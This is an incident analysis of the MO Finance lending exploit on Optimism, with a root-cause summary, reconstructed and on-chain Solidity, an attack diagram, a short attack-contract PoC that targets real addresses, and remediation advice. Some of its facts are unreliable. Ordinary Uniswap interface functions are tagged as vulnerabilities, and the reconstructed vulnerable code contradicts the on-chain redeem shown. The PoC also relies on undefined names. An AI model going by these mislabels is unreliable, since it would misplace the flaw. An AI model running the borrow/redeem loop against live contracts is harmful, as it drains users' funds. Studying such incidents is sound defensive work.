# MO — Repeated borrow/redeem Business Logic Flaw Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | MO Finance |
| **Chain** | Optimism |
| **Loss** | ~$413,000 |
| **Vulnerable Contract** | [Loan 0xAe7b6514](https://optimistic.etherscan.io/address/0xAe7b6514Af26BcB2332FEA53B8Dd57bc13A7838E) |
| **MO Token** | [0x61445Ca4](https://optimistic.etherscan.io/address/0x61445Ca401051c86848ea6b1fAd79c5527116AA1) |
| **Approve Proxy** | [0x9D8355a8](https://optimistic.etherscan.io/address/0x9D8355a8D721E5c79589ac0aB49BC6d3e0eF7C3F) |
| **UniV2 Pair** | [0x4a6E0fAd](https://optimistic.etherscan.io/address/0x4a6E0fAd381d992f9eB9C037c8F78d788A9e8991) |
| **Root Cause** | `Loan.borrow()` can be called repeatedly without proper collateral or duplicate borrow validation, and `redeem()` executes without position validity checks, draining LP liquidity |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/MO_exp.sol) |

---

## 1. Vulnerability Overview

MO Finance's `Loan.borrow()` function lacks validation against repeated borrowing from the same account. An attacker was able to call `borrow()` multiple times within a loop and immediately liquidate each borrow position via `redeem()`, draining liquidity from the MO/USDT pair.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no restriction on repeated borrow/redeem calls
interface ILoan {
    function borrow(uint256 amount) external;
    function redeem(uint256 positionId) external;
}

// borrow(): allows repeated borrowing without collateral or with insufficient collateral
function borrow(uint256 amount) external {
    // No validation against repeated borrow within the same TX
    // Insufficient collateral ratio validation
    positions[msg.sender].push(Position(amount, block.timestamp));
    token.transfer(msg.sender, amount);
}

// redeem(): only checks whether the position exists
function redeem(uint256 positionId) external {
    Position memory pos = positions[msg.sender][positionId];
    require(pos.amount > 0, "no position");
    delete positions[msg.sender][positionId];
    // Immediate liquidation with no additional validation
}

// ✅ Safe code: collateral ratio validation + cooldown
mapping(address => uint256) public lastBorrowBlock;

function borrow(uint256 amount) external {
    require(block.number > lastBorrowBlock[msg.sender] + BORROW_COOLDOWN, "cooldown");
    require(getCollateralRatio(msg.sender) >= MIN_COLLATERAL_RATIO, "insufficient collateral");
    lastBorrowBlock[msg.sender] = block.number;
    positions[msg.sender].push(Position(amount, block.timestamp));
    token.transfer(msg.sender, amount);
}
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: Loan.sol
    function redeem(uint256 index) public {  // ❌ Vulnerability
        BorrowOrder storage order = borrowOrders[msg.sender][index];
        if (order.amount == 0) revert InvalidIndex();
        if (order.duration != 0 && block.timestamp < order.expiredTime) revert NotExpired();
        if (order.finished == true) revert Finished();

        uint256 intere = interest(msg.sender, index);
        uint256 amount = (order.amount * redeemRate) / BASE;

        IApproveProxy(approveProxy).claim(
            supplyToken,
            msg.sender,
            address(this),
            order.total + intere
        );
        IERC20(borrowToken).safeTransfer(msg.sender, amount);
        order.finished = true;

        emit BorrowOrderFinished(msg.sender, index, amount, intere);
    }
```

```solidity
// File: IUniswapV2Router.sol
    function addLiquidity(  // ❌ Vulnerability
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
```

```solidity
// File: IUniswapV2Pair.sol
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);  // ❌ Vulnerability

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address, address) external;

    function claim(address token, address to, uint256 amount) external;

    function setRouter(address _router) external;
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Deploy intermediary contract (manages token approvals)
  │
  ├─→ [2] Loop: repeated borrow() calls
  │         └─ Receives MO tokens without collateral validation
  │
  ├─→ [3] Immediately redeem() each position
  │         └─ Liquidate positions to acquire additional assets
  │
  ├─→ [4] Swap accumulated MO → USDT (UniV2)
  │
  └─→ [5] ~$413K USDT profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ILoan {
    function borrow(uint256 amount) external;
    function redeem(uint256 positionId) external;
}

interface IRelation {
    function register(address referrer) external;
}

contract AttackContract {
    ILoan    constant loan     = ILoan(0xAe7b6514Af26BcB2332FEA53B8Dd57bc13A7838E);
    IERC20   constant MO       = IERC20(0x61445Ca401051c86848ea6b1fAd79c5527116AA1);
    IERC20   constant USDT     = IERC20(0x94b008aA00579c1307B0EF2c499aD98a8ce58e58);
    IUniRouter constant router = IUniRouter(0x9eADD135641f8b8cC4E060D33d63F8245f42bE59);

    function testExploit() external {
        // [1] Repeated borrow/redeem loop
        for (uint i = 0; i < 100; i++) {
            loan.borrow(borrowAmount);
            loan.redeem(i);
        }

        // [2] Swap accumulated MO → USDT
        uint256 moBal = MO.balanceOf(address(this));
        MO.approve(address(router), moBal);
        swapMOToUSDT(moBal);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Business Logic Flaw (repeated borrow/liquidation) |
| **CWE** | CWE-840: Business Logic Errors |
| **Attack Vector** | External (repeated borrow + redeem loop) |
| **DApp Category** | DeFi Lending Protocol |
| **Impact** | LP liquidity drained (~$413K) |

## 6. Remediation Recommendations

1. **Collateral Ratio Validation**: Verify that sufficient collateral is deposited before allowing `borrow()`
2. **Borrow Cooldown**: Apply a block or time-based restriction on repeated borrowing from the same account
3. **Maximum Borrow Per Position**: Limit the maximum borrow amount per individual position and per account in aggregate
4. **Redemption Delay**: Enforce a minimum holding period before `redeem()` can be called

## 7. Lessons Learned

- The `borrow()` and `redeem()` function pair in lending protocols is particularly vulnerable to repeated-loop attacks.
- Allowing uncollateralized borrowing can drain an entire protocol's TVL in a single transaction.
- The same vulnerability patterns recur on L2 networks such as Optimism and must be recognized accordingly.